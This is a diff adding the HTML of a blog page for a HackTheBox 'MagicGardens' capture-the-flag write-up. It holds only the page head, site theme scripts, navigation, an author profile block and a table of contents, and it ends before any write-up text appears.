@@ -1,0 +1,1601 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>MagicGardens Writeup - HackTheBox &middot; Rezy Dev</title>
+  <meta name="title" content="MagicGardens Writeup - HackTheBox &middot; Rezy Dev" />
+  
+  <meta name="description" content="I&#39;m Rezy Dev a Security Researcher, Penetration Tester &amp; AppSec Nerd. Working in network pentest and web-app hacking, delivering quality work. It&#39;s my portfolio" />
+  <meta name="keywords" content="HackTheBox, Linux, Insane, " />
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/hackthebox/magicgardens/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.e2114b503a26289ae9e641622acb390597c1daf1900ba891cdd2501b9eddb59bfada3af6589f61d6344d2c0e46705aba955e3faf3de6aad2b04613543f0322f0.css"
+    integrity="sha512-4hFLUDomKJrp5kFiKss5BZfB2vGQC6iRzdJQG57dtZv62jr2WJ9h1jRNLA5GcFq6lV4/rz3mqtKwRhNUPwMi8A==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.55d70af2ac9cbc52f4b3a22c1562a4924d00f0ec10e2758a0a502414b89b74ae7a50fd604ffb88d2fb82e43831a23ed56326a26580117701f20483b61efd902e.js"
+    integrity="sha512-VdcK8qycvFL0s6IsFWKkkk0A8OwQ4nWKClAkFLibdK56UP1gT/uI0vuC5Dgxoj7VYyaiZYARdwHyBIO2Hv2QLg==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="MagicGardens Writeup - HackTheBox" />
+<meta property="og:description" content="Link: https://app." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/hackthebox/magicgardens/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-10-09T00:00:00+00:00" />
+
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="MagicGardens Writeup - HackTheBox"/>
+<meta name="twitter:description" content="Link: https://app."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "MagicGardens Writeup - HackTheBox",
+    "headline": "MagicGardens Writeup - HackTheBox",
+    
+    "abstract": "Link: https:\/\/app.",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/hackthebox\/magicgardens\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Rezy Dev"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-10-09T00:00:00\u002b00:00",
+    "datePublished": "2024-10-09T00:00:00\u002b00:00",
+    
+    "dateModified": "2024-10-09T00:00:00\u002b00:00",
+    
+    "keywords": ["HackTheBox","Linux","Insane"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2112"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Rezy Dev" />
+  
+  
+  
+  <link href="mailto:me@rezydev.xyz" rel="me" />
+  
+  
+  <link href="https://discord.com/users/412880625629134855" rel="me" />
+  
+  
+  <link href="https://github.com/Rezy-Dev" rel="me" />
+  
+  
+  <link href="https://linkedin.com/in/RezyDev" rel="me" />
+  
+  
+  <link href="https://twitter.com/RezyDev" rel="me" />
+  
+  
+  <link href="https://youtube.com/@RezyDev" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Rezy Dev</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        home
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/whoami/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        whoami
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        posts
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        writeups
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/projects/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        projects
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        tags
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            home
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/whoami/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            whoami
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            posts
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            writeups
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/projects/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            projects
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            tags
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+ 
+
+
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      >Rezy Dev</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/hackthebox/magicgardens/"
+      >MagicGardens Writeup - HackTheBox</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      MagicGardens Writeup - HackTheBox
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-10-09 00:00:00 &#43;0000 UTC">9 October 2024</time><span class="px-2 text-primary-500">&middot;</span><span>2112 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">10 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+<script type="text/javascript" src="/js/zen-mode.min.63c8a202661f4a2063fdc2706685d668e8ea3da613da2224e9da527e5876e4f53dcac39ab60732626fb4151feae5d430d0cf44731e5d3c726522fcc1519c1547.js" integrity="sha512-Y8iiAmYfSiBj/cJwZoXWaOjqPaYT2iIk6dpSflh25PU9ysOatgcyYm&#43;0FR/q5dQw0M9Ecx5dPHJlIvzBUZwVRw=="></script>
+
+<span class="mb-[2px]">
+    <span id="zen-mode-button"
+          class="text-lg hover:text-primary-500"
+          title="Enable zen mode"
+          data-title-i18n-disable="Enable zen mode"
+          data-title-i18n-enable="Disable zen mode">
+        <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg>
+  </span>
+
+</span>
+    </span>
+</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="Rezy Dev" src="/img/profile_hu7d5cb18dca3a3bcddbe3db69cb7ad546_209563_192x192_fill_box_center_3.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Rezy Dev
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Security Researcher | Web &amp; Network Pentester | AppSec Nerd</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="mailto:me@rezydev.xyz"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://discord.com/users/412880625629134855"
+          target="_blank"
+          aria-label="Discord"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/Rezy-Dev"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://linkedin.com/in/RezyDev"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://twitter.com/RezyDev"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://youtube.com/@RezyDev"
+          target="_blank"
+          aria-label="Youtube"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-access">Initial Access</a></li>
+    <li><a href="#root-flag--user-flag">Root Flag &amp; User Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
